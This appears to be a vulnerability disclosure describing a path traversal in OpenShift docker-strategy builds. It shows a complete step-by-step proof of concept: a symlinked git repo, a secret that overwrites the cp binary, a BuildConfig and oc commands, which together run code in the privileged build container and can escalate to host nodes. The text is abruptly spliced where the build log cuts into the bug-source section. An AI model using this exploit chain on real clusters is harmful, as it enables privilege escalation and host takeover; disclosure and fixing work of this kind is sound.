# Vulnerability overview

`OpenShift` allows a user to create his own images with the help of the build component. This component has three primary build strategies available ([Docu - Understanding image builds](https://docs.openshift.com/container-platform/4.16/cicd/builds/understanding-image-builds.html)):

* Docker build
* Source-to-Image (S2I) build
* Custom build

As the builds are running in a privileged container, a vulnerability in this process allows an atttacker to escalate their permissions on the cluster and host nodes.

The `custom build` is not safe, because they can execute any code within a privileged container and are disabled by default.
The other two strategies are considered as safe and are enabled for all users that can create builds. 

But there is a note about the `docker strategy`:

>  Grant docker build permissions with caution, because a vulnerability in the Dockerfile processing logic could result in a privileges being granted on the host node.

See: https://docs.openshift.com/container-platform/4.16/cicd/builds/securing-builds-by-strategy.html


The `docker strategy` / the image used during the build has a vulnerabiliy, which allows an attacker to override files inside the privileged build container with the help of the `spec.source.secrets.secret.destinationDir` attribute of the `BuildConfig` definition. After overriding the binary, execution of this overriden file can be triggered with another secret and the malicious code is executed in the privileged container.  

As stated above, running code in a privileged container allows an attacker to escalate their permissions on the cluster and host nodes. As an example the host filesystem of the worker node can be mounted and a new `SSH` key can be added to user `core` of the `Red Hat Enterprise Linux CoreOS (RHCOS)`.

# Proof of concept
To exploit the vulnerability the following steps have to be done:

1) Create a `git` repository with a `Dockerfile` and a symbolic link to `/usr/bin`
2) Create a secret, with the key `cp` and the content is the bash script executed during exploitation
3) Create another secret with arbitrary content, only used to trigger the exploit
4) Create a `BuildConfig`:
  * Using `docker` as `spec.strategy.type`
  * Reference the created 'git' repo in `spec.source.git.uri`
  * Reference both secrets in `spec.source.secrets`
  * Set the `spec.source.secrets[0].destinationDir` attr to the symblic link from to `git` repo
5) Trigger the build, which executes the payload in the privileged container

## Step1 - Git repo
Create a `git` repository which can be access by `OpenShift` and add a `Dockerfile` and a symbolic link.

```bash
mkdir /tmp/poc-repo
cd /tmp/poc-repo
git init
touch Dockerfile
# provide content for dockerfile
ln -s /usr/bin usr_bin

git add Dockerfile  usr_bin
git commit -m "PoC"
git push
 ```

The `Dockerfile` has the following content (snippet):

```dockerfile
COPY . .
RUN ls -la
```
*[Dockerfile](/assets/openshift/Dockerfile)*

It copies all files from the current `docker build` `ContextDir`. During the build the `ContextDir` is set to `/tmp/build/inputs/` in the privilged build containers filesystem.
Then it lists all copied files via `ls`. 

## Step2 - Create secret with payload to execute
Create a new secret which uses the key `cp` and set the exploit payload as value and apply it.

```yaml
kind: Secret
apiVersion: v1
metadata:
  name: build-path-traversal  
stringData:
  cp: |
    #!/bin/bash
    
    touch /tmp/build/inputs/poc-rce.txt
type: Opaque

```
*[secret-build-path-traversal.yaml](/assets/openshift/definition/secret-build-path-traversal.yaml)*  

```bash
oc apply -f ./definition/secret-build-path-traversal.yaml 
secret/build-path-traversal created
```


The provided payload creates a file in the `docker build` `ContextDir`, which should be copied to the image during the build via `COPY . .`.

```bash
#!/bin/bash    
touch /tmp/build/inputs/poc-rce.txt
```

## Step3 - Create the "trigger" secret
Create a new secret with arbitrary content and apply it.

```yaml
kind: Secret
apiVersion: v1
metadata:
  name: trigger-rce
stringData:
  trigger: pwned

type: Opaque

```
*[secret-trigger-rce.yml](/assets/openshift/definition/secret-trigger-rce.yaml)*  

```bash
oc apply -f ./definition/secret-trigger-rce.yaml
secret/trigger-rce created
```

## Step4 - Create a BuildConfig
Then `BuildConfig` config has to be created and applied.

```yaml
kind: BuildConfig
apiVersion: build.openshift.io/v1
metadata:
  name: build-priv-esc
spec:
  nodeSelector: null
  strategy:
    type: Docker
    dockerStrategy:    
      dockerfilePath: Dockerfile
  source:
    type: Git
    git:
      uri: 'https://<REDACTED>/build-rce-poc.git'
      ref: main
    contextDir: /
    secrets:
      - secret:
          name: build-path-traversal
        destinationDir: usr_bin
      - secret:
          name: trigger-rce
```
*[build-cfg.yaml](/assets/openshift/definition/build-cfg.yaml)*  

```bash
oc apply -f ./definition/build-cfg.yaml
buildconfig.build.openshift.io/build-priv-esc created
```

The important parts of this definion are:
* Using the `docker strategy`:
  ```yaml
  spec:
    nodeSelector: null
    strategy:
      type: Docker  
  ```
* Set the `destinationDir` of `secret/build-path-traversal` to the symbolic link in the `git` repo
  ```yaml
  spec:
  # ....  
      contextDir: /
      secrets:
        - secret:
            name: build-path-traversal
          destinationDir: usr_bin  
  ```

## Step5 - Trigger the build / RCE
After starting the build, the log can be inspected and verified that `RUN ls -la` lists the file `poc-rce.txt`.

```bash
oc start-build build-priv-esc
build.build.openshift.io/build-priv-esc-7 started
```

```txt
...
STEP 5/8: RUN ls -la
total 4
drwxr-xr-x    1 root     root            70 Jul 31 07:57 .
dr-xr-xr-x    1 root     root            17 Jul 31 07:57 ..
drwxr-xr-x    8 root     root           163 Jul 31 07:57 .git

# Source of the bug
The source code of the builder image can be found on [GitHub - Builder](https://github.com/openshift/builder).
Doing some manual source code review revealed the bug. The code for handling the `docker strategy` and copying secrets can be found in `pkg\build\builder\docker.go`.

		if err != nil {
			log.V(4).Infof("Build source %q failed to copy: %q", s.LocalObjectRef().Name, string(out))
			return err
		}		
}
```

# Solution

To fix this vulnerability the variable `dstDir` in the function `copyLocalObject` has to be validated to share a common `basePath` with the `docker build` `ContextDir` after it has been made absolute (resolve `/../` ) and canonicalized (resolve symblic links).
